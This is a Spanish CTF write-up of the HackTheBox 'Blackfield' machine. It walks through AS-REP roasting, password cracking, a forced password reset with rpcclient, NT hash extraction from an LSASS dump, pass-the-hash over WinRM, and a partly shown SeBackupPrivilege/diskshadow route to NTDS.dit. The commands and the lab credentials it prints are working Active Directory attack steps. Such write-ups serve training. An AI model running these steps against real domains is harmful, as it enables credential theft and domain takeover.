---
title: "Blackfield Write-UP | HackTheBox"
date: "2021-07-05"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-07-05-blackfield-write-up-hackthebox
image:
   path: header/blackfield_card.webp
   lqip: data:image/webp;base64,UklGRlwAAABXRUJQVlA4IFAAAACQAwCdASoUAA0APzmEuVOvKKWisAgB4CcJagDE2CFbjfNz62AAAP7c2ygl1o8iYryGd+2LGMUnAEQb0gPqsTKX32Oe9KeCEVyx2ePa0buAAA==
   
published: true
---

## Descripción

En esta máquina Blackfield de la plataforma **Hackthebox** con dificultad "Hard" y OS Windows, haremos uso de técnicas de explotación para Windows Active Directory.

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para descubrir el tipo de SO que utiliza la máquina objetivo en base al TTL.

Nos encontramos con una máquina de SO Windows:

```bash
# ping -c 1 10.129.44.182
PING 10.129.44.182 (10.129.44.182) 56(84) bytes of data.
64 bytes from 10.129.44.182: icmp_seq=1 ttl=127 time=50.2 ms

--- 10.129.44.182 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.225/50.225/50.225/0.000 ms
```

Hacemos uso de la herramienta NMAP para descubrir puertos abiertos:

```bash
# Nmap 7.91 scan initiated Sat Jul  3 11:24:47 2021 as: nmap -p- --open --min-rate 5000 -n -Pn -vvv -oG allPorts -oN blackfield.initScan 10.129.44.182
Nmap scan report for 10.129.44.182
Host is up, received user-set (0.048s latency).
Scanned at 2021-07-03 11:24:47 CEST for 26s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        REASON
53/tcp   open  domain         syn-ack ttl 127
88/tcp   open  kerberos-sec   syn-ack ttl 127
135/tcp  open  msrpc          syn-ack ttl 127
389/tcp  open  ldap           syn-ack ttl 127
445/tcp  open  microsoft-ds   syn-ack ttl 127
593/tcp  open  http-rpc-epmap syn-ack ttl 127
3268/tcp open  globalcatLDAP  syn-ack ttl 127
5985/tcp open  wsman          syn-ack ttl 127
```

Con los puertos que Nmap nos ha encontrado, podemos hacernos una idea de que se trata de un DC Windows Server.

Lanzamos nuevamente NMAP para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos:

```bash
# Nmap 7.91 scan initiated Sat Jul  3 11:26:07 2021 as: nmap -sC -sV -p53,88,135,389,445,593,3268,5985 -n -Pn -oN blackfield.services 10.129.44.182
Nmap scan report for 10.129.44.182
Host is up (0.049s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-03 17:26:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-03T17:26:20
|_  start_date: N/A
```

Nada fuera de lo normal, únicamente nos muestra el nombre completo del servicio corriendo tras los puertos.

Empezaremos a lanzar **crackmapexec** para comprobar ante qué nos estamos enfrentando:

```bash
# crackmapexec smb 10.129.44.182
SMB         10.129.44.182   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

Vemos que tiene dominio, por lo tanto pasaremos a añadirlo al archivo Hosts para que resuelva correctamente las peticiones que lancemos al dominio:

```bash
# echo -e "10.129.44.182\\tblackfield.local" >> /etc/hosts; tail -n2 /etc/hosts

# HackTheBox Machines
10.129.44.182   blackfield.local
```

Vamos a enumerar el puerto 53 para comprobar si podemos realizar transferencia de zona y descubrir nuevos hosts a nivel de DNS:

```bash
# dig ANY @10.129.1.243 blackfield.local

; <<>> DiG 9.16.13-Debian <<>> ANY @10.129.44.182 blackfield.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7572
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;blackfield.local.              IN      ANY

;; ANSWER SECTION:
blackfield.local.       600     IN      A       10.10.10.192
blackfield.local.       3600    IN      NS      dc01.blackfield.local.
blackfield.local.       3600    IN      SOA     dc01.blackfield.local. hostmaster.blackfield.local. 136 900 600 86400 3600
blackfield.local.       600     IN      AAAA    dead:beef::4986:ad14:46dc:438d
blackfield.local.       600     IN      AAAA    dead:beef::4468:3f7e:db10:377

;; ADDITIONAL SECTION:
dc01.blackfield.local.  3600    IN      A       10.129.44.182
dc01.blackfield.local.  3600    IN      AAAA    dead:beef::95a0:db49:d359:61ba

;; Query time: 48 msec
;; SERVER: 10.129.44.182#53(10.129.44.182)
;; WHEN: lun jul 05 08:57:38 CEST 2021
;; MSG SIZE  rcvd: 227

# dig axfr @10.129.44.182 localhost

; <<>> DiG 9.16.13-Debian <<>> axfr @10.129.44.182 localhost
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Vemos que únicamente nos muestra el DC01, que es la máquina que estamos realizando pentest. La transferencia de zona no está habilitada, por lo tanto seguimos enumerando.

Tiramos de **rpcclient** para comprobar si tenemos habilitado el acceso con **Null Session** y seguir enumerando, pero nos encontramos Acceso denegado:

```bash
# rpcclient -U '' -N 10.129.44.182
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

Como hemos visto que el puerto **445/SMB** está disponible, pasamos a enumerar con **Smbclient** y vemos que hay directorios interesantes:

```bash
# smbclient -L \\\\10.129.44.182 -N

        Sharename       Type      Comment
        --------- ---- -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Como no sabemos en que directorios tenemos permisos, lanzamos **Smbmap** para comprobar si disponemos de permisos de lectura o escritura. Este paso podriamos haberlo realizando antes que el anterior, pero bueno estamos aquí para practicar y está bien realizar pasos de más recordando otros comandos y sus utilidades:

```bash
# smbmap -u 'x' -H 10.129.44.182
[+] Guest session       IP: 10.129.44.182:445   Name: blackfield.local                                  
        Disk                                                    Permissions     Comment
        ---- ----------- -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

En el directorio **profiles$** tenemos permisos de **READ ONLY**, en este caso vamos a listar los recursos que contiene y para que nos puede servir:

```bash
# smbclient \\\\\\\\10.129.44.182\\\\profiles$ -N | tee profiles.txt
Try "help" to get a list of possible commands.
smb: \\> dir

	.                                   D        0  Wed Jun  3 18:47:12 2020                                                                                                                                                                                   
  ..                                  D        0  Wed Jun  3 18:47:12 2020                                                                                                                                                                                   
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                                                                                   
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                                                                                   
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                                                                                   
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                                                                                   
  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020                                                                                                                                                                                   
  AChampken                           D        0  Wed Jun  3 18:47:11 2020

(...)

# cat profiles.txt| awk '{print$1}' | tail -n +5 | head -n -4 > users.txt

# head -n 10 users.txt                                                   
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
```

Vemos que se trata al parecer de nombres de inicio de sesión, por lo tanto almacenamos estos nombres quedándonos únicamente con el primer campo utilizando AWK y eliminando las líneas que no nos hacen falta como se muestra en el código anterior y lo almacenamos en el archivo **users.txt**.

## Explotación

Pasamos a la fase de explotación. Podemos intentar lanzar de primeras la técnica de **ASREPROAST**, pero primero vamos a realizar enumeración de usuario a nivel de **kerberos** para verificar que usuarios tienen habilitada la configuración de **UF\_DONT\_REQUIRE\_PREAUTH** y obtener así **TGT**.

Para ello vamos utilizar la herramienta **Kerbrute** y le pasamos como argumento el archivo **users.txt** donde hemos almacenado anteriormente los perfiles de usuario que hemos encontrado:

- [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```bash
opt/kerbrute/kerbrute userenum users.txt -d blackfield.local --dc 10.129.44.182

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        

Version: dev (n/a) - 07/03/21 - Ronnie Flathers @ropnop

2021/07/03 12:12:06 >  Using KDC(s):
2021/07/03 12:12:06 >   10.129.44.182:88

2021/07/03 12:12:26 >  [+] VALID USERNAME:       audit2020@blackfield.local
2021/07/03 12:14:19 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:21e60dd993eb7c287567b7a5837112d6$ba799725db2d61fe46e7b2cdd7af5569f78b76feb53b3848a686a32e1a8ba1484731c15722f506035d65a7f4242683015f94a43628b0efb634268f4c1b750b7967c2a4a3b3170079b8e69b1ba4c7cb9a413e3cc71f41d39efba2eb56cf2d9b19bb83d740b888dbb89ec9ab382e61192d0acaccf5a8c6948b60fa683e86439a7715c2123449373de464b6b2a741a216ab24c8d027e76c42e23eaab674460b736d90034bcb6abdd9a669e120dfcaa5db05ebeb708ec0dc3f23978b5ab129fd05f5b7b4058cd7c2dbcefaa4f64037f7d4b3e7e69f929a007a39f0787da49f2e53ca194345bd488f0a2347924908d37fc0cf1faf95cf8da317b9b3e3c32e47c7c9157d0c1e215162c86d
2021/07/03 12:14:19 >  [+] VALID USERNAME:       support@blackfield.local
2021/07/03 12:14:24 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2021/07/03 12:14:49 >  Done! Tested 314 usernames (3 valid) in 163.461 seconds
```

Kerbrute nos indica los usuarios válidos a nivel de dominio, como vemos tenemos 3 (**audit2020**, **support** y **svc\_backup**).

De todos los usuarios de los que disponemos en el **users.txt**, únicamente el usuario "**support**" tiene seteada dicha configuración. Como podemos comprobar, **Kerbrute** también nos realiza el dumpeo del **HASH**, pero esto no es 100% fiable y prefiero realizarlo con la herramienta **GetNPUsers** de la suite de herramientas **Impacket**, así que vamos a ello:

Ahora sí, lanzamos la técnica de **ASREPROAST** y almacenamos el hash para posteriormente aplicarle ataque por diccionario:

```bash
# impacket-GetNPUsers blackfield.local/ -usersfile users_asreproast.txt -dc-ip 10.129.44.182 -request -format john -outputfile hashes.asreproast
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

# catn hashes.asreproast 
$krb5asrep$support@BLACKFIELD.LOCAL:167100f5b6c758d0d95398808c9a5105$ff98ed595f0ffd0d34e0143b7ebacb403960afb5a038ba1b6ed198195c6559d8eb79008f5de72ebcd99aa92c35f82d8b20493335633a49f059c70e4b37d7ac5a3ca12249e9639f6b281361376f2012563a9aa5cb999674ae67cd77bc2d076ada8a3a4c6754d65684c26746b46eefc5dd0eb3958cf41a4230b295b158964620b6feb07a32bed3262516440d1e7e07bb372ba6e878eb48b74e14fc13eb9c605ed6d552523cf2718141ad9a35d9a1d197ab57e55eb7aec93c576656e559b71c5b5314fc7bd4770b08490b471e66a5b399b8d553dcab737e945a1779922abb8a6e3bd65e88dcc11cf422efead8d69687e3e6e86543b7
```

Con el hash en nuestro poder, vamos a realizar un ataque por diccionario con nuestro querido **JohnTheRipper** para intentar conseguir la contraseña del usuario "**support**":

```bash
#john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)
1g 0:00:00:14 DONE (2021-07-04 10:26) 0.06882g/s 986648p/s 986648c/s 986648C/s #13Carlyn.."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

La contraseña es: **#00^BlackKnight**

Podemos verificar con **CrackMapExec** que las credenciales que hemos obtenido son válidas:

```bash
# crackmapexec smb 10.129.44.182 -u support -p '#00^BlackKnight'    
SMB         10.129.44.182   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.44.182   445    DC01             [+] BLACKFIELD.local\\support:#00^BlackKnight
```

Lo son.

En los puertos que nos ha reportado **NMAP**, tenemos el querido **5985/WinRM**. Este puerto nos permite conectarnos de manera remota con la herramienta **Evil-WinRM** y obtener shell con PS, pero en este caso está capado para el usuario "support":

```bash
evil-winrm -i 10.129.44.182 -u support -p '#00^BlackKnight'                                                                                

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Como vemos, nos indica "**AuthorizationError**", por lo tanto hace pensar que tenemos que realizar escalada de privilegios horizontal. Si nos fijamos en los usuarios que disponemos en el archivo **users.txt**, tenemos 3 usuarios los cuales son interesantes: **support**, **svc\_backup** y **audit2020**, por lo tanto alguno de ellos tendrá que ser.

Hemos visto anteriormente que no tenemos acceso para realizar enumeración con **RPCCLIENT** y null session, pero en este caso tenemos credenciales válidas a nivel de dominio, por lo tanto realizamos enumeración rápida para comprobar si algún usuario a nivel de dominio tiene añadido algún comentario, no suele darse mucho el caso, pero en CTF estó está a la orden del día:

```bash
# echo; for rid in $(rpcclient -U 'support%#00^BlackKnight' 10.129.44.182 -c enumdomusers | awk '{print$2}' | grep -oP '\\[.*?\\]' | tr -d '[]'); do rpcclient -U 'support%#00^BlackKnight' 10.129.44.182 -c "queryuser $rid" | grep -E 'User Name|Description|Comment';echo; done | tee rpcenum.txt

# cat rpcenum.txt

				User Name   :   Administrator
        Description :   Built-in account for administering the computer/domain
        Comment     :

        User Name   :   Guest
        Description :   Built-in account for guest access to the computer/domain
        Comment     :

        User Name   :   krbtgt
        Description :   Key Distribution Center Service Account
        Comment     :

        User Name   :   audit2020
        Description :
        Comment     :

        User Name   :   support
        Description :
        Comment     :

				User Name   :   svc_backup
        Description :
        Comment     :

				(...)
```

No encontramos información útil adherida a los usuarios.

Con las credenciales de support, vamos a listar nuevamente los directorios a los cuales tenemos acceso del puerto **445/SMB**:

```bash
# smbmap -u 'support' -p '#00^BlackKnight' -H 10.129.44.182
[+] IP: 10.129.44.182:445       Name: blackfield.local                                  
        Disk                                                    Permissions     Comment
        ---- ----------- -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

Tenemos acceso de **READ ONLY** en nuevos directorios mostrados, pero ya os adelanto que no hay nada interesante.

Llegados a este punto, no hemos obtenido shell del sistema por lo tanto no podemos ejecutar el collector Sharphound.ps1 de BloodHound on site, así que no nos queda otra que ejecutar el collector de BloodHound remoto para obtener los recuros necesarios para este. Para ellos vamos a utilizar la heramienta **Bloodhound.py**:

- [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```bash
# bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.44.182 --zip
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 11S
INFO: Compressing output into 20210704111914_bloodhound.zip
```

Una vez tenemos el comprimido en formato ZIP (no es necesario que esté comprimido, pero a mi me gusta así para tener mejor orden), pasamos ejecutar **BloodHound** e importar el comprimido para que podamos visualizar los grafos.

```bash
# neo4j console
# bloodhound --no-sandbox &>/dev/null &
```

Introducimos el usuario y vemos que tenemos 1 permiso de salida para el usuario "**audit2020**" con "**ForceChangePassword**".

![](body/b0e719b001d06e0b32f3e603df8db76ec944e02c.png)

Este privilegio nos permite cambiar la contraseña del usuario audit2020 sin tener conocimiento de la contraseña actual del usuario:

![](body/7db8d1ee231578da5a258a79587c4703231bc1b4.png)

Bueno, este paso lo podemos realizar de 2 formas distintas:

- Utilizando Net
- Utilizando Rpcclient

**NET:**

```bash
# net rpc password audit2020 -U support -S 10.129.44.182
Enter new password for audit2020:
Enter WORKGROUP\\support's password:
```

**RPCCLIENT:**

```bash
# rpcclient -U 'support%#00^BlackKnight' 10.129.44.182 -c "setuserinfo2 audit2020 23 Admin01\\!"
```

El **level 23** viene de **UserInternal4Information** (_Indicates the Buffer parameter is to be interpreted as a SAMPR\_USER\_INTERNAL4\_INFORMATION structure_), podemos ver el artículo en este enlace de Microsoft: [MS\_SAMR](https://msdn.microsoft.com/en-us/library/cc245617.aspx).

Ahora que hemos cambiado la contraseña del usuario "**audit2020**", vamos a verificar que las credenciales de acceso son correctas con **CrackMapExec**:

```bash
# crackmapexec smb 10.129.44.182 -u audit2020 -p 'Admin01!'                                          
SMB         10.129.44.182   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.44.182   445    DC01             [+] BLACKFIELD.local\\audit2020:Admin01!
```

Perfecto, son correctas a nivel de dominio.

Listamos nuevamente los directorios a los cuales tenemos acceso en el puerto **445/SMB** con **SMBMAP** para ver si ahora disponemos de distintos permisos:

```bash
smbmap -u 'audit2020' -p 'Admin01!' -H 10.129.44.182                                         
[+] IP: 10.129.44.182:445        Name: 10.129.44.182                                      
        Disk                                                    Permissions     Comment
        ---- ----------- -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

Como vemos, ahora tenemos permisos de **READ ONLY** en el directorio "**forensic**".

Enumerando un poco el recurso, vemos que tenemos acceso a un directorio llamado "**memory\_analysis**" en el cual se encuentra un comprimido ZIP de **lsass**. Nos lo descargamos y lo descomprimimos:

```bash
# smbclient \\\\\\\\10.129.44.182\\\\forensic -U audit2020%Admin01!
Try "help" to get a list of possible commands.
smb: \\> dir
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020
                7846143 blocks of size 4096. 4121236 blocks available
# smb: \\> cd memory_analysis
# smb: \\memory_analysis\\> dir
  .                                   D        0  Thu May 28 22:28:33 2020
  ..                                  D        0  Thu May 28 22:28:33 2020
	(...)
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
	(...)

                7846143 blocks of size 4096. 4121236 blocks available
# smb: \\memory_analysis\\> get lsass.zip
getting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip (3743,4 KiloBytes/sec) (average 3743,4 KiloBytes/sec)

# unzip lsass.zip             
Archive:  lsass.zip
  inflating: lsass.DMP               

# ls -l lsass.*
.rw-r--r-- root root 136.4 MB Sun Feb 23 11:02:02 2020  lsass.DMP
.rw-r--r-- root root    40 MB Mon Jul  5 10:09:18 2021  lsass.zip
```

Nos ha descomprimido un dump del proceso **LSASS** (_Local Security Authority Subsystem Service_), este contiene información acerca de los inicios de sesión de los usuarios del sistema, por lo tanto puede contener credenciales de acceso.

Para poder visualizar el contenido de **LSASS**, vamos a utilizar la herramienta **Pypykatz**:

- [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

```bash
# pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{print$2}' | sort -u > lsass_users.txt              
INFO:root:Parsing file lsass.DMP
7f1e4ff8c6a8e6b6fcae2d9c0572cd62
9658d1d1dcd9250115e2205d9f48400d
b624dc83a27cc29da11d9bf25efea796

# pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{print$2}' | sort -u  > lsass_nt.txt         
INFO:root:Parsing file lsass.DMP

Administrator
dc01$
DC01$
svc_backup
```

Por un lado se ha almacenado los **Hashes NT** encontrados y por otro los nombres de usuario, así podemos realizar un **Hash Spraying** con **CrackMapExec** para que realice variaciones de usuario/hash.

Pasamos a lanzar **CrackMapExec** para que nos indique que usuario y hash son válidos realizando combinaciones:

```bash
# crackmapexec smb 10.129.44.182 -u lsass_users.txt -H lsass_nt.txt
SMB         10.129.44.182    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\Administrator:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\Administrator:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\dc01$:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\dc01$:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\dc01$:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\DC01$:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\DC01$:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\DC01$:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [-] BLACKFIELD.local\\svc_backup:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.129.44.182    445    DC01             [+] BLACKFIELD.local\\svc_backup 9658d1d1dcd9250115e2205d9f48400d
```

Vemos que HASH **9658d1d1dcd9250115e2205d9f48400d** pertenece al usuario **SVC\_BACKUP**.

Lanzamos **Evil-WinRM** para comprobar si podemos obtener acceso al sistema:

```bash
# evil-winrm -i 10.129.44.182 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                    

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami
blackfield\\svc_backup
```

Perfecto, ya tenemos acceso al sistema con shell de **Powershell**.

### User Flag

Ahora podemos visualizar la flag **user.txt** en el directorio **Desktop** del usuario **svc\_backup**:

```powershell
*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> cd ../desktop
*Evil-WinRM* PS C:\\Users\\svc_backup\\desktop> type user.txt
aef07e083dbfa617684e4b6af244c238
```

## Escalada de privilegios

Se viene la escalada de privilegios...

Enumerando al usuario **svc\_backup**, vemos que tenemos asignado el privilegio "**SeBackupPrivilege**" y además pertenece al grupo de **Backup Operators,** esto nos hace pensar que podemos dumpear el archivo **SYSTEM** y **NTDS** (nivel de dominio) para obtener los hashes de acceso al sistema de todos los usuarios del dominio.

```powershell
*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\\High Mandatory Level       Label            S-1-16-12288
```

Primero vamos a dumpear el archivo **SYSTEM** a través de **REG**:

```powershell
*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> cd C:\\Windows\\temp
*Evil-WinRM* PS C:\\Windows\\temp> reg save HKLM\\system system
The operation completed successfully.

*Evil-WinRM* PS C:\\Windows\\temp> dir

    Directory: C:\\Windows\\temp

Mode                LastWriteTime         Length Name
---- ------------- ------ ----
-a---- 7/5/2021   8:30 AM       17219584 system

*Evil-WinRM* PS C:\\Windows\\temp> download system
Info: Downloading C:\\Windows\\temp\\system to system

                                                             
Info: Download successful!
```

Por otro lado, necesitaremos dumpear el archivo **NTDS.dit**, para esto vamos a hacer uso de **DiskShadow**. Por si alguno quiere conocer más de DiskShadow, dejo por aquí un artículo interesante:

- [https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)

Primero creamos un archivo txt con las siguientes instrucciones que nos van a permitir crear una unidad lógica (Z) de la cual extraer el archivo **NTDS**:

```bash
# cat diskshadow.txt -p

set context persistent nowriters 
add volume c: alias temp 
create 
expose %temp% z: 
```

**IMPORTANTE**: Detrás de cada instrucción en el archivo, debemos colocar un espacio en blanco, ya que de lo contrario no funcionará.

Subimos el txt a la máquina (o lo creamos directamente en esta) y ejecutamos DiskShadow:

```bash
*Evil-WinRM* PS C:\\Users\\svc_backup\\Desktop\\backup> diskshadow.exe /s diskshadow
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/4/2021 7:43:46 PM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {c0923ace-4f7c-4103-b22b-a482d236cf63} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {0586abbf-92f8-4aa9-ae77-31739d568ee3} set as environment variable.

Querying all shadow copies with the shadow copy set ID {0586abbf-92f8-4aa9-ae77-31739d568ee3}

        * Shadow copy ID = {c0923ace-4f7c-4103-b22b-a482d236cf63}               %temp%
                - Shadow copy set: {0586abbf-92f8-4aa9-ae77-31739d568ee3}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\]
